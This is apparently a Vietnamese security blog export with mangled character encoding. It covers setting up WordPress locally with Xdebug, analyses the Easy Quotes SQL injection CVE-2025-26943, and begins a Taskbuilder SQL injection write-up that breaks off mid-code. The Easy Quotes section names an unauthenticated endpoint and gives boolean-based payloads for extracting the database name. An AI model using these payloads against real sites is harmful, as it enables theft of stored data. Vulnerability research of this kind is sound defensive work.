ğŸ‘‰ Hoáº·c náº¿u khÃ´ng muá»‘n disable, cÃ³ thá»ƒ thÃªm ServerName vÃ o VirtualHost WordPress Ä‘á»ƒ Apache phÃ¢n biá»‡t domain.\n\u0026lt;VirtualHost *:80\u0026gt; ServerName mywordpress.local DocumentRoot /srv/www/wordpress ... \u0026lt;/VirtualHost\u0026gt; Muá»‘n cháº¡y Ä‘Æ°á»£c thÃ¬ pháº£i cáº¥u hÃ¬nh DNS hoáº·c sá»­a file hosts:\nLinux/Mac: /etc/hosts Windows: C:\\Windows\\System32\\drivers\\etc\\hosts Reload Apache:\nsudo service apache2 reload Táº£i láº¡i cáº¥u hÃ¬nh má»›i mÃ  khÃ´ng cáº§n dá»«ng server Configure database WordPress cáº§n má»™t cÆ¡ sá»Ÿ dá»¯ liá»‡u (MySQL/MariaDB) Ä‘á»ƒ lÆ°u:\nBÃ i viáº¿t, trang, menu NgÆ°á»i dÃ¹ng, máº­t kháº©u (hash) Cáº¥u hÃ¬nh site Plugins, themes settings Má»Ÿ MySQL vá»›i quyá»n root:\nsudo mysql -u root Cáº¥u hÃ¬nh MySQL:\n-- Táº¡o database wordpress mysql\u0026gt; CREATE DATABASE wordpress; Query OK, 1 row affected (0,00 sec) -- Táº¡o user riÃªng cho wordpress mysql\u0026gt; CREATE USER wordpress@localhost IDENTIFIED BY \u0026#39;\u0026lt;your-password\u0026gt;\u0026#39;; Query OK, 1 row affected (0,00 sec) -- Cáº¥p quyá»n cho user WordPress mysql\u0026gt; GRANT SELECT,INSERT,UPDATE,DELETE,CREATE,DROP,ALTER ON wordpress.* TO wordpress@localhost; Query OK, 1 row affected (0,00 sec) -- LÃ m má»›i láº¡i quyá»n mysql\u0026gt; FLUSH PRIVILEGES; Query OK, 1 row affected (0,00 sec) -- ThoÃ¡t mysql\u0026gt; quit Bye Khá»Ÿi Ä‘á»™ng láº¡i dá»‹ch vá»¥:\nsudo service mysql start Configure WordPress to connect to the database Copy file cáº¥u hÃ¬nh máº«u:\nsudo -u www-data cp /srv/www/wordpress/wp-config-sample.php /srv/www/wordpress/wp-config.php WordPress khi táº£i vá» cÃ³ sáºµn file wp-config-sample.php Báº¡n copy nÃ³ thÃ nh wp-config.php Ä‘á»ƒ lÃ m file cáº¥u hÃ¬nh chÃ­nh cho site Chá»‰nh sá»­a thÃ´ng tin database:\nsudo -u www-data sed -i \u0026#39;s/database_name_here/wordpress/\u0026#39; /srv/www/wordpress/wp-config.php sudo -u www-data sed -i \u0026#39;s/username_here/wordpress/\u0026#39; /srv/www/wordpress/wp-config.php sudo -u www-data sed -i \u0026#39;s/password_here/\u0026lt;your-password\u0026gt;/\u0026#39; /srv/www/wordpress/wp-config.php ÄÃ¢y lÃ  3 dÃ²ng thay tháº¿ text trong file wp-config.php: database_name_here =\u0026gt; wordpress (tÃªn DB Ä‘Ã£ táº¡o á»Ÿ bÆ°á»›c trÆ°á»›c) username_here =\u0026gt; wordpress (user MySQL Ä‘Ã£ táº¡o) password_here =\u0026gt; \u0026lt;your-password\u0026gt; (password Ä‘Ã£ set) Khi Apache cháº¡y WordPress, nÃ³ sáº½ Ä‘á»c file nÃ y Ä‘á»ƒ biáº¿t dÃ¹ng user nÃ o + DB nÃ o Ä‘á»ƒ káº¿t ná»‘i MySQL ThÃªm Secret Keys vÃ  Salts:\nsudo -u www-data nano /srv/www/wordpress/wp-config.php ğŸ‘‰ ÄÃ¢y lÃ  chuá»—i bÃ­ máº­t mÃ  WordPress dÃ¹ng Ä‘á»ƒ:\nMÃ£ hÃ³a session cookies Sinh ra token (nonce) chá»‘ng CSRF NgÄƒn cháº·n táº¥n cÃ´ng kiá»ƒu â€œknown secretâ€ (vÃ­ dá»¥ káº» táº¥n cÃ´ng Ä‘oÃ¡n Ä‘Æ°á»£c secret máº·c Ä‘á»‹nh Ä‘á»ƒ giáº£ máº¡o login) define( \u0026#39;AUTH_KEY\u0026#39;, \u0026#39;put your unique phrase here\u0026#39; ); define( \u0026#39;SECURE_AUTH_KEY\u0026#39;, \u0026#39;put your unique phrase here\u0026#39; ); define( \u0026#39;LOGGED_IN_KEY\u0026#39;, \u0026#39;put your unique phrase here\u0026#39; ); define( \u0026#39;NONCE_KEY\u0026#39;, \u0026#39;put your unique phrase here\u0026#39; ); define( \u0026#39;AUTH_SALT\u0026#39;, \u0026#39;put your unique phrase here\u0026#39; ); define( \u0026#39;SECURE_AUTH_SALT\u0026#39;, \u0026#39;put your unique phrase here\u0026#39; ); define( \u0026#39;LOGGED_IN_SALT\u0026#39;, \u0026#39;put your unique phrase here\u0026#39; ); define( \u0026#39;NONCE_SALT\u0026#39;, \u0026#39;put your unique phrase here\u0026#39; ); Thay Ä‘á»•i nÃ³ báº±ng cÃ¡c chuá»—i random sau: https://api.wordpress.org/secret-key/1.1/salt/\nConfigure WordPress Truy cáº­p http://localhost, Ä‘áº·t site title, username, password, email cho user admin\nSetup Debug on VSCode Äá»ƒ hiá»ƒu Ä‘Æ°á»£c luá»“ng cá»§a trang web cháº¡y vÃ  xá»­ lÃ­ á»Ÿ má»—i request, ta cáº§n pháº£i debug nÃ³.\nAdd PHP Debug extension on VS Code VÃ o Extensions (Ctrl+Shift+X) =\u0026gt; tÃ¬m PHP Debug (by Felix Becker) =\u0026gt; Install. Extension nÃ y káº¿t ná»‘i vá»›i Xdebug.\nInstall Xdebug on Ubuntu sudo apt install php-xdebug -y Kiá»ƒm tra cÃ i chÆ°a:\nphp -v Náº¿u cÃ³ dÃ²ng with Xdebug v3.x.x nghÄ©a lÃ  Ä‘Ã£ OK.\nConfigure Xdebug sudo nano /etc/php/\u0026lt;version\u0026gt;/apache2/php.ini ThÃªm vÃ o cuá»‘i file\nzend_extension=xdebug.so xdebug.mode=debug xdebug.start_with_request=yes xdebug.client_host=127.0.0.1 xdebug.client_port=9003 Port máº·c Ä‘á»‹nh má»›i cá»§a Xdebug v3 lÃ  9003.\nSau Ä‘Ã³ restart Apache:\nsudo systemctl restart apache2 Configure VSCode launch.json Má»Ÿ thÆ° má»¥c chá»©a trang web wordpress báº±ng VSCode\ncode /srv/www/wordpress Trong VS Code =\u0026gt; Run and Debug (Ctrl+Shift+D) =\u0026gt; táº¡o file launch.json vá»›i ná»™i dung:\n{ \u0026#34;version\u0026#34;: \u0026#34;0.2.0\u0026#34;, \u0026#34;configurations\u0026#34;: [ { \u0026#34;name\u0026#34;: \u0026#34;Listen for Xdebug\u0026#34;, \u0026#34;type\u0026#34;: \u0026#34;php\u0026#34;, \u0026#34;request\u0026#34;: \u0026#34;launch\u0026#34;, \u0026#34;port\u0026#34;: 9003, \u0026#34;pathMappings\u0026#34;: { \u0026#34;/srv/www/wordpress\u0026#34;: \u0026#34;${workspaceFolder}\u0026#34; } } ] } pathMappings: Ã¡nh xáº¡ thÆ° má»¥c trong container/server (/srv/www/wordpress) vá» thÆ° má»¥c local cá»§a trong VS Code.\nNhÆ° váº­y lÃ  Ä‘Ã£ hoÃ n thÃ nh setup WordPress trÃªn local káº¿t há»£p Debug nÃ³ trÃªn VSCode.\nExtend Required Version Má»—i phiÃªn báº£n WordPress thÆ°á»ng Ä‘i kÃ¨m 1 phiÃªn báº£n PHP thÃ­ch há»£p. NÃªn kiá»ƒm tra tÃ­nh tÆ°Æ¡ng thÃ­ch nÃ y Ä‘á»ƒ quÃ¡ trÃ¬nh setup khÃ´ng bá»‹ lá»—i.\nWordPress Auto Update Tá»« WordPress 3.7 trá»Ÿ Ä‘i (2013), WordPress cÃ³ cÆ¡ cháº¿ tá»± Ä‘á»™ng cáº­p nháº­t (automatic background updates) cho:\nBáº£n vÃ¡ báº£o máº­t (security release). Báº£n báº£o trÃ¬ (maintenance release). KhÃ´ng tá»± Ä‘á»™ng update major version (trá»« khi báº­t rÃµ rÃ ng). Há»‡ thá»‘ng kiá»ƒm tra vá»›i server api.wordpress.org Ä‘á»ƒ xem cÃ³ báº£n vÃ¡ nÃ o má»›i sáº½ tá»± Ä‘á»™ng nÃ¢ng cáº¥p background lÃªn. Viá»‡c nÃ y diá»…n ra ráº¥t nhanh sau khi setup, nÃªn báº¡n tháº¥y code Ä‘á»•i khÃ¡c so vá»›i source gá»‘c.\nQuÃ¡ trÃ¬nh setup diá»…n ra khi truy cáº­p /wp-admin/install.php\nÄá»ƒ vÃ´ hiá»‡u hÃ³a cÆ¡ cháº¿ cáº­p nháº­t tá»± Ä‘á»™ng nÃ y, thÃªm dÃ²ng sau vÃ o wp-config.php:\ndefine( \u0026#39;WP_AUTO_UPDATE_CORE\u0026#39;, false ); Increase Uploadable Plugin Size Máº·c Ä‘á»‹nh, WordPress phá»¥ thuá»™c vÃ o cáº¥u hÃ¬nh PHP (upload_max_filesize, post_max_size, vÃ  Ä‘Ã´i khi cáº£ max_execution_time) Ä‘á»ƒ xÃ¡c Ä‘á»‹nh dung lÆ°á»£ng file tá»‘i Ä‘a cÃ³ thá»ƒ upload. TrÃªn nhiá»u hosting, giá»›i háº¡n nÃ y chá»‰ khoáº£ng 2MB â€“ 8MB, khÃ´ng Ä‘á»§ cho cÃ¡c plugin hiá»‡n Ä‘áº¡i.\nWhy Increase the Limit? Plugin dung lÆ°á»£ng lá»›n: CÃ¡c plugin nhÆ° WooCommerce extension, page builder, backup, hoáº·c security suite cÃ³ thá»ƒ náº·ng 20MB â€“ 100MB.\nTrÃ¡nh lá»—i upload: Náº¿u file .zip lá»›n hÆ¡n giá»›i háº¡n, báº¡n sáº½ gáº·p lá»—i:\nâ€œThe uploaded file exceeds the upload_max_filesize directive in php.iniâ€ Hoáº·c upload tháº¥t báº¡i. Thuáº­n tiá»‡n cho quáº£n trá»‹ viÃªn: CÃ³ thá»ƒ cÃ i trá»±c tiáº¿p qua Dashboard mÃ  khÃ´ng cáº§n FTP/SSH.\nHá»— trá»£ phÃ¡t triá»ƒn plugin: Plugin tá»± viáº¿t kÃ¨m nhiá»u thÆ° viá»‡n/asset cÃ³ thá»ƒ khÃ¡ náº·ng, viá»‡c tÄƒng giá»›i háº¡n giÃºp test dá»… dÃ ng hÆ¡n.\nHow to Increase Plugin Upload Size Sá»­a php.ini (náº¿u cÃ³ quyá»n server):\nupload_max_filesize = 64M post_max_size = 64M max_execution_time = 300 Sá»­a file .htaccess (náº¿u dÃ¹ng Apache):\nphp_value upload_max_filesize 64M php_value post_max_size 64M php_value max_execution_time 300 php_value max_input_time 300 ThÃªm vÃ o wp-config.php:\n@ini_set( \u0026#39;upload_max_filesize\u0026#39; , \u0026#39;64M\u0026#39; ); @ini_set( \u0026#39;post_max_size\u0026#39;, \u0026#39;64M\u0026#39;); @ini_set( \u0026#39;max_execution_time\u0026#39;, \u0026#39;300\u0026#39; ); ğŸ‘‰ Lá»i khuyÃªn: Chá»‰ nÃªn Ä‘áº·t giá»›i háº¡n vá»«a Ä‘á»§ (64MB hoáº·c 128MB). TrÃ¡nh Ä‘áº·t quÃ¡ lá»›n Ä‘á»ƒ háº¡n cháº¿ nguy cÆ¡ bá»‹ upload file náº·ng gÃ¢y quÃ¡ táº£i server.\n","permalink":"//localhost:1313/vi/posts/2025-09-20-wordpress-local-and-debugging/","summary":"\u003cp\u003e\u003cstrong\u003eWordPress\u003c/strong\u003e lÃ  má»™t há»‡ thá»‘ng quáº£n lÃ½ ná»™i dung (CMS) máº¡nh máº½ vÃ  phá»• biáº¿n nháº¥t cho phÃ©p báº¡n táº¡o, quáº£n lÃ½ vÃ  tÃ¹y chá»‰nh cÃ¡c trang web vÃ  blog má»™t cÃ¡ch dá»… dÃ ng. NÃ³ lÃ  open-source CMS, Ä‘Æ°á»£c xÃ¢y dá»±ng trÃªn PHP vÃ  sá»­ dá»¥ng cÆ¡ sá»Ÿ dá»¯ liá»‡u MySQL hoáº·c Maria DB.\u003c/p\u003e\n\u003cul\u003e\n\u003cli\u003eRa Ä‘á»i nÄƒm 2003, ban Ä‘áº§u chá»‰ Ä‘á»ƒ viáº¿t blog, sau Ä‘Ã³ phÃ¡t triá»ƒn thÃ nh ná»n táº£ng táº¡o website, cá»­a hÃ ng online, diá»…n Ä‘Ã n, landing pageâ€¦\u003c/li\u003e\n\u003cli\u003eHiá»‡n nay, hÆ¡n 40% website trÃªn tháº¿ giá»›i cháº¡y báº±ng WordPress.\u003c/li\u003e\n\u003c/ul\u003e\n\u003cp\u003eCÃ³ 2 phiÃªn báº£n WordPress:\u003c/p\u003e","title":"WordPress Local and Debugging"},{"content":"Lá»— há»•ng xáº£y ra trÃªn plugin Easy Quotes cá»§a WordPress trÆ°á»›c phiÃªn báº£n 1.2.3. Äiá»u nÃ y cÃ³ thá»ƒ cho phÃ©p káº» táº¥n cÃ´ng trá»±c tiáº¿p tÆ°Æ¡ng tÃ¡c vá»›i cÆ¡ sá»Ÿ dá»¯ liá»‡u cá»§a báº¡n, bao gá»“m khÃ´ng giá»›i háº¡n á»Ÿ viá»‡c Ä‘Ã¡nh cáº¯p thÃ´ng tin.\nCVE ID: CVE-2025-26943 Product: WordPress Easy Quotes Plugin Vulnerability Type: SQL Injection Affected Versions: \u0026lt;= 1.2.2 CVSS severity: High (9.3) Required Privilege: Unauthenticated Requirements Local WordPress and Debugging Taskbuilder Plugin: v1.2.2(vul) vÃ  v1.2.3(fix) diff tool: meld hoáº·c báº¥t cá»© tool nÃ o cÃ³ thá»ƒ compare Ä‘á»ƒ tháº¥y Ä‘Æ°á»£c sá»± khÃ¡c biá»‡t giá»¯a 2 version Analysis á»¨ng dá»¥ng Ä‘Ã£ Ä‘Æ°a trá»±c tiáº¿p dá»¯ liá»‡u tá»« ngÆ°á»i dÃ¹ng vÃ o cÃ¢u query SQL mÃ  khÃ´ng sá»­ dá»¥ng cÃ¡c biá»‡n phÃ¡p báº£o vá»‡ khiáº¿n lá»— há»•ng SQL Injection xáº£y ra.\nPatch Diff DÃ¹ng diff tool báº¥t kÃ¬ Ä‘á»ƒ so sÃ¡nh sá»± khÃ¡c biá»‡t giá»¯a báº£n lá»—i vÃ  báº£n vÃ¡. CÃ³ sá»± khÃ¡c biá»‡t rÃµ á»Ÿ file includes/quotes-data.php\nprivate static function get_family_data($family) { /** @var wpdb $wpdb */ global $wpdb; $tablename = $wpdb-\u0026gt;prefix . \u0026#39;easy-quotes-families\u0026#39;; return $wpdb-\u0026gt;get_row(\u0026#34;SELECT * FROM `\u0026#34;.$tablename.\u0026#34;` WHERE `family`=\u0026#39;\u0026#34;.$family.\u0026#34;\u0026#39;;\u0026#34;); } {: file=\u0026ldquo;includes/quotes-data.php v1.2.2\u0026rdquo; }\nBáº£n vÃ¡ sá»­ dá»¥ng $wpdb-\u0026gt;prepare() thay vÃ¬ truyá»n trá»±c tiáº¿p dá»¯ liá»‡u tá»« ngÆ°á»i dÃ¹ng vÃ o cÃ¢u query.\nprivate static function get_family_data($family) { /** @var wpdb $wpdb */ global $wpdb; $tablename = $wpdb-\u0026gt;prefix . \u0026#39;easy-quotes-families\u0026#39;; $sql = $wpdb-\u0026gt;prepare( \u0026#34;SELECT * FROM %i WHERE `family` = %s\u0026#34;, $tablename, $family ); return $wpdb-\u0026gt;get_row($sql); } CÃ³ nhiá»u hÃ m cÅ©ng Ä‘Æ°á»£c vÃ¡ báº±ng cÃ¡ch trÃªn, nhÆ°: get_font_variant($family_id, $variant_id), get_font_variants($family), get_fonts($category = -1)\nTuy get_fonts_categories() Ä‘Ã£ Ä‘Æ°á»£c vÃ¡ nhÆ°ng nÃ³ khÃ´ng chá»©a dá»¯ liá»‡u tá»« ngÆ°á»i dÃ¹ng, nÃªn khÃ´ng cáº§n quan tÃ¢m\npublic static function get_fonts_categories() { /** @var wpdb $wpdb */ global $wpdb; $tablename = $wpdb-\u0026gt;prefix . \u0026#39;easy-quotes-categories\u0026#39;; $sql = $wpdb-\u0026gt;prepare( \u0026#34;SELECT `category_id`, `category` FROM %i\u0026#34;, $tablename ); return $wpdb-\u0026gt;get_results($sql); } How it work? Ta khai thÃ¡c lá»—i SQL Injection trong hÃ m get_family_data($family), cÃ¡c hÃ m cÃ²n láº¡i khai thÃ¡c tÆ°Æ¡ng tá»±.\nget_family_data() lÃ  hÃ m public trong class Quotes_Data\nclass Quotes_Data { function __construct() { add_filter(\u0026#39;posts_where\u0026#39;, array($this, \u0026#39;posts_where\u0026#39;), 10, 2); } // other function public static function get_font_variants($family) { $familyData = self::get_family_data($family); // other logic } public static function get_family($family, $variant_id) { $family_data = (array)self::get_family_data($family); // other logic } private static function get_family_data($family) { /** @var wpdb $wpdb */ global $wpdb; $tablename = $wpdb-\u0026gt;prefix . \u0026#39;easy-quotes-families\u0026#39;; return $wpdb-\u0026gt;get_row(\u0026#34;SELECT * FROM `\u0026#34;.$tablename.\u0026#34;` WHERE `family`=\u0026#39;\u0026#34;.$family.\u0026#34;\u0026#39;;\u0026#34;); } } get_family_data() Ä‘Æ°á»£c gá»i trong 2 hÃ m get_family() vÃ  get_font_variants() cá»§a class Quotes_Data, Ä‘á»ƒ biáº¿t chÃºng sá»­ dá»¥ng á»Ÿ Ä‘Ã¢u, ta tÃ¬m kiáº¿n vá»›i tá»« khÃ³a get_family hoáº·c get_font_variants\nHÃ m get_font_variants() Ä‘Æ°á»£c gá»i trong hÃ m rest_route_callback_font_variants() cá»§a class Quotes_Rest_Route\nclass Quotes_Rest_Route { function __construct() { add_action(\u0026#39;rest_api_init\u0026#39;, array($this, \u0026#39;rest_api_init\u0026#39;)); } /** * Register my REST route * * @return void */ function rest_api_init($wp_rest_server) { $args = [ \u0026#39;method\u0026#39; =\u0026gt; WP_REST_Server::READABLE, \u0026#39;callback\u0026#39; =\u0026gt; [$this, \u0026#39;rest_route_callback_quote\u0026#39;], \u0026#39;permission_callback\u0026#39; =\u0026gt; \u0026#39;__return_true\u0026#39; ]; register_rest_route(\u0026#39;layart/v1\u0026#39;, \u0026#39;/quote\u0026#39;, $args); // other logic $args[\u0026#39;callback\u0026#39;] = [$this, \u0026#39;rest_route_callback_font_variants\u0026#39;]; register_rest_route(\u0026#39;layart/v1\u0026#39;, \u0026#39;/font-variants\u0026#39;, $args); } // other function function rest_route_callback_font_variants(WP_REST_Request $request) { $family = $request-\u0026gt;get_param(\u0026#39;family\u0026#39;); $family = isset($family) ? $family : \u0026#34;Shadows Into Light\u0026#34;; $response = Quotes_Data::get_font_variants($family); return rest_ensure_response($response); } } HÃ m khá»Ÿi táº¡o cá»§a class Quotes_Rest_Route sá»­ dá»¥ng add_action(hook_name, callback) vá»›i hook_name lÃ  rest_api_init Ä‘á»ƒ Ä‘Äƒng kÃ½ cÃ¡c endpoint tÃ¹y chá»‰nh vá»›i REST API System cá»§a WordPress\nCallback rest_api_init sá»­ dá»¥ng register_rest_route nhiá»u láº§n Ä‘á»ƒ táº¡o cÃ¡c endpoint dÆ°á»›i namespace layart/v1\nrest_route_callback_font_variants lÃ  callback cá»§a endpoint /wp-json/layart/v1/font-variants?family=family_name\n$family máº·c Ä‘á»‹nh lÃ  Shadows Into Light náº¿u khÃ´ng Ä‘Æ°á»£c truyá»n trong param.\nExploit Detect SQLi Ta thá»­ ká»¹ thuáº­t Boolean-based SQL Injection Ä‘á»ƒ kiá»ƒm tra xem tham sá»‘ family cÃ³ dá»… bá»‹ chÃ¨n lá»‡nh SQL hay khÃ´ng.\nTrue request: Khi Ä‘Ã³, cÃ¢u query thá»±c thi sáº½ trá»Ÿ thÃ nh:\nSELECT * FROM wp_easy-quotes-families WHERE family=\u0026#39;Roboto\u0026#39;+AND+\u0026#39;1\u0026#39;=\u0026#39;1\u0026#39;\u0026#34; Äiá»u kiá»‡n AND '1'='1' luÃ´n Ä‘Ãºng =\u0026gt; query há»£p lá»‡, tráº£ vá» dá»¯ liá»‡u bÃ¬nh thÆ°á»ng.\nFalse request: Khi Ä‘Ã³, cÃ¢u query thá»±c thi sáº½ trá»Ÿ thÃ nh:\nSELECT * FROM wp_easy-quotes-families WHERE family=\u0026#39;Roboto\u0026#39;+AND+\u0026#39;1\u0026#39;=\u0026#39;2\u0026#39;\u0026#34; Äiá»u kiá»‡n AND '1'='2' luÃ´n sai =\u0026gt; query khÃ´ng khá»›p =\u0026gt; tráº£ vá» [].\nGet First Letter of Database Name Äiá»u kiá»‡n tiÃªn quyáº¿t Ä‘á»ƒ dump Ä‘Æ°á»£c háº¿t data lÃ  pháº£i dump Ä‘Æ°á»£c 1 kÃ½ tá»± báº¥t ká»³ cá»§a tÃªn database, náº¿u láº¥y Ä‘Æ°á»£c thÃ¬ toÃ n bá»™ data Ä‘á»u dump Ä‘Æ°á»£c.\nDatabase name Ä‘Æ°á»£c tÃ´i Ä‘áº·t tÃªn lÃ  wordpress nÃªn kÃ­ tá»± Ä‘áº§u tiÃªn lÃ  w {: .prompt-info }\nResponse tráº£ vá» dá»¯ liá»‡u bÃ¬nh thÆ°á»ng =\u0026gt; kÃ­ tá»± Ä‘áº§u tiÃªn lÃ  w\nKhi Ä‘Ã³, cÃ¢u query thá»±c thi sáº½ trá»Ÿ thÃ nh:\nSELECT * FROM wp_easy-quotes-families WHERE family=\u0026#39;Roboto\u0026#39;+AND+SUBSTRING(DATABASE(),1,1)=\u0026#39;w\u0026#39;\u0026#34; Automatic Extraction Dá»±a trÃªn kÄ© thuáº­t boolean base ta viáº¿t script Ä‘á»ƒ tá»± Ä‘á»™ng khai thÃ¡c.\nScript Here\nConclusion Lá»— há»•ng CVE-2025-26943 trong plugin WordPress Easy Quotes trÆ°á»›c phiÃªn báº£n 1.2.3 xuáº¥t phÃ¡t tá»« viá»‡c khÃ´ng sá»­ dá»¥ng cÆ¡ cháº¿ chuáº©n bá»‹ truy váº¥n ($wpdb-\u0026gt;prepare) mÃ  truyá»n trá»±c tiáº¿p dá»¯ liá»‡u tá»« ngÆ°á»i dÃ¹ng vÃ o cÃ¢u lá»‡nh SQL dáº«n Ä‘áº¿n lá»— há»•ng SQL Injection.\nBáº£n vÃ¡ chÃ­nh thá»©c Ä‘Ã£ thay tháº¿ viá»‡c ná»‘i chuá»—i báº±ng cÃ¡ch dÃ¹ng $wpdb-\u0026gt;prepare, giÃºp Ä‘áº£m báº£o dá»¯ liá»‡u Ä‘áº§u vÃ o Ä‘Æ°á»£c kiá»ƒm soÃ¡t vÃ  an toÃ n hÆ¡n.\nKey takeaways:\nLuÃ´n sá»­ dá»¥ng $wpdb-\u0026gt;prepare() khi lÃ m viá»‡c vá»›i database trong WordPress Ä‘á»ƒ trÃ¡nh SQL Injection. ThÆ°á»ng xuyÃªn cáº­p nháº­t plugin vÃ  kiá»ƒm tra báº£o máº­t Ä‘á»ƒ trÃ¡nh trá»Ÿ thÃ nh má»¥c tiÃªu táº¥n cÃ´ng. References SQL Injection cheat sheet - PortSwigger\nWordPress Easy Quotes Plugin \u0026lt;= 1.2.2 is vulnerable to SQL Injection\n","permalink":"//localhost:1313/vi/posts/2025-09-23-cve-2025-26943/","summary":"\u003cp\u003eLá»— há»•ng xáº£y ra trÃªn plugin \u003cstrong\u003eEasy Quotes\u003c/strong\u003e cá»§a WordPress trÆ°á»›c phiÃªn báº£n \u003cstrong\u003e1.2.3\u003c/strong\u003e. Äiá»u nÃ y cÃ³ thá»ƒ cho phÃ©p káº» táº¥n cÃ´ng trá»±c tiáº¿p tÆ°Æ¡ng tÃ¡c vá»›i cÆ¡ sá»Ÿ dá»¯ liá»‡u cá»§a báº¡n, bao gá»“m khÃ´ng giá»›i háº¡n á»Ÿ viá»‡c Ä‘Ã¡nh cáº¯p thÃ´ng tin.\u003c/p\u003e\n\u003cul\u003e\n\u003cli\u003e\u003cstrong\u003eCVE ID\u003c/strong\u003e: \u003ca href=\"https://www.cve.org/CVERecord?id=CVE-2025-26943\"\u003eCVE-2025-26943\u003c/a\u003e\u003c/li\u003e\n\u003cli\u003e\u003cstrong\u003eProduct\u003c/strong\u003e: \u003ca href=\"https://wordpress.org/plugins/easy-quotes/#description\"\u003eWordPress Easy Quotes Plugin\u003c/a\u003e\u003c/li\u003e\n\u003cli\u003e\u003cstrong\u003eVulnerability Type\u003c/strong\u003e: SQL Injection\u003c/li\u003e\n\u003cli\u003e\u003cstrong\u003eAffected Versions\u003c/strong\u003e: \u0026lt;= 1.2.2\u003c/li\u003e\n\u003cli\u003e\u003cstrong\u003eCVSS severity\u003c/strong\u003e: High (9.3)\u003c/li\u003e\n\u003cli\u003e\u003cstrong\u003eRequired Privilege\u003c/strong\u003e: Unauthenticated\u003c/li\u003e\n\u003c/ul\u003e\n\u003ch2 id=\"requirements\"\u003eRequirements\u003c/h2\u003e\n\u003cul\u003e\n\u003cli\u003e\u003ca href=\"https://w41bu1.github.io/posts/wordpress-local-and-debugging/\"\u003e\u003cstrong\u003eLocal WordPress and Debugging\u003c/strong\u003e\u003c/a\u003e\u003c/li\u003e\n\u003cli\u003e\u003cstrong\u003eTaskbuilder Plugin\u003c/strong\u003e:  v1.2.2(vul) vÃ  v1.2.3(fix)\u003c/li\u003e\n\u003cli\u003e\u003cstrong\u003ediff tool\u003c/strong\u003e: \u003cstrong\u003emeld\u003c/strong\u003e hoáº·c báº¥t cá»© tool nÃ o cÃ³ thá»ƒ compare Ä‘á»ƒ tháº¥y Ä‘Æ°á»£c sá»± khÃ¡c biá»‡t giá»¯a 2 version\u003c/li\u003e\n\u003c/ul\u003e\n\u003ch2 id=\"analysis\"\u003eAnalysis\u003c/h2\u003e\n\u003cp\u003eá»¨ng dá»¥ng Ä‘Ã£ Ä‘Æ°a trá»±c tiáº¿p dá»¯ liá»‡u tá»« ngÆ°á»i dÃ¹ng vÃ o cÃ¢u query SQL mÃ  \u003cstrong\u003ekhÃ´ng sá»­ dá»¥ng cÃ¡c biá»‡n phÃ¡p báº£o vá»‡\u003c/strong\u003e khiáº¿n lá»— há»•ng SQL Injection xáº£y ra.\u003c/p\u003e","title":"CVE-2025-26943"},{"content":"Lá»— há»•ng xáº£y ra trÃªn plugin Taskbuilder cá»§a WordPress trÆ°á»›c phiÃªn báº£n 4.0.2. Äiá»u nÃ y cÃ³ thá»ƒ cho phÃ©p káº» táº¥n cÃ´ng trá»±c tiáº¿p tÆ°Æ¡ng tÃ¡c vá»›i cÆ¡ sá»Ÿ dá»¯ liá»‡u cá»§a báº¡n, bao gá»“m khÃ´ng giá»›i háº¡n á»Ÿ viá»‡c Ä‘Ã¡nh cáº¯p thÃ´ng tin.\nCVE ID: CVE-2025-39569 Product: WordPress Hostel Plugin Vulnerability Type: SQL Injection Affected Versions: \u0026lt; 4.0.2 CVSS severity: High (8.5) Required Privilege: Subscriber Requirements Local WordPress and Debugging Taskbuilder Plugin: v4.0.1(vul) vÃ  v4.0.2(fix) diff tool: meld hoáº·c báº¥t cá»© tool nÃ o cÃ³ thá»ƒ compare Ä‘á»ƒ tháº¥y Ä‘Æ°á»£c sá»± khÃ¡c biá»‡t giá»¯a 2 version Analysis á»¨ng dá»¥ng Ä‘Ã£ xá»­ lÃ½ dá»¯ liá»‡u Ä‘áº§u vÃ o trÆ°á»›c khi Ä‘Æ°a vÃ o cÃ¢u SQL. Tuy nhiÃªn, trong quÃ¡ trÃ¬nh xÃ¢y dá»±ng truy váº¥n, giÃ¡ trá»‹ nÃ y Ä‘Æ°á»£c chÃ¨n trá»±c tiáº¿p mÃ  khÃ´ng Ä‘Æ°á»£c bao trong dáº¥u nhÃ¡y Ä‘Æ¡n '...'. Äiá»u Ä‘Ã³ khiáº¿n káº» táº¥n cÃ´ng cÃ³ thá»ƒ chÃ¨n thÃªm cÃ¡c thÃ nh pháº§n cÃº phÃ¡p SQL há»£p lá»‡ (nhÆ° OR, AND,...) vÃ o truy váº¥n, dáº«n Ä‘áº¿n lá»— há»•ng SQL Injection.\nPatch Diff DÃ¹ng diff tool báº¥t kÃ¬ Ä‘á»ƒ so sÃ¡nh sá»± khÃ¡c biá»‡t giá»¯a báº£n lá»—i vÃ  báº£n vÃ¡. CÃ³ sá»± khÃ¡c biá»‡t rÃµ á»Ÿ file includes/admin/projects/get_users.php\nTrong phiÃªn báº£n v4.0.1, biáº¿n $proj_id sau khi escape Ä‘Æ°á»£c Ä‘Æ°a tháº³ng vÃ o cÃ¢u truy váº¥n mÃ  khÃ´ng cÃ³ dáº¥u nhÃ¡y Ä‘Æ¡n bao quanh:\n$proj_id = esc_sql($proj_id); $project = $wpdb-\u0026gt;get_row( \u0026#34;SELECT * FROM {$wpdb-\u0026gt;prefix}wppm_project where id = $proj_id\u0026#34; ); á» báº£n v4.0.2, truy váº¥n Ä‘Ã£ Ä‘Æ°á»£c Ä‘iá»u chá»‰nh báº±ng cÃ¡ch Ä‘áº·t $proj_id trong dáº¥u nhÃ¡y Ä‘Æ¡n sau khi escape:\n$proj_id = esc_sql($proj_id); $project = $wpdb-\u0026gt;get_row( \u0026#34;SELECT * FROM {$wpdb-\u0026gt;prefix}wppm_project where id = \u0026#39;$proj_id\u0026#39;\u0026#34; ); Báº£n vÃ¡ nÃ y Ä‘áº£m báº£o ráº±ng giÃ¡ trá»‹ $proj_id sau khi escape Ä‘Æ°á»£c coi lÃ  má»™t chuá»—i literal, khÃ´ng thá»ƒ thoÃ¡t ra khá»i dáº¥u nhÃ¡y Ä‘Æ¡n Ä‘á»ƒ chÃ¨n thÃªm cÃº phÃ¡p SQL, qua Ä‘Ã³ ngÄƒn cháº·n táº¥n cÃ´ng SQL Injection.\nHow it work? File architecture:\nCáº¥u trÃºc chung cá»§a file hiá»‡n táº¡i\n$proj_id = esc_sql($proj_id); $project = $wpdb-\u0026gt;get_row(\u0026#34;SELECT * FROM {$wpdb-\u0026gt;prefix}wppm_project WHERE id = $proj_id\u0026#34;); // Báº¯t Ä‘áº§u buffer Ä‘á»ƒ táº¡o ná»™i dung chÃ­nh (body) cá»§a modal ob_start(); // ... render HTML danh sÃ¡ch users $body = 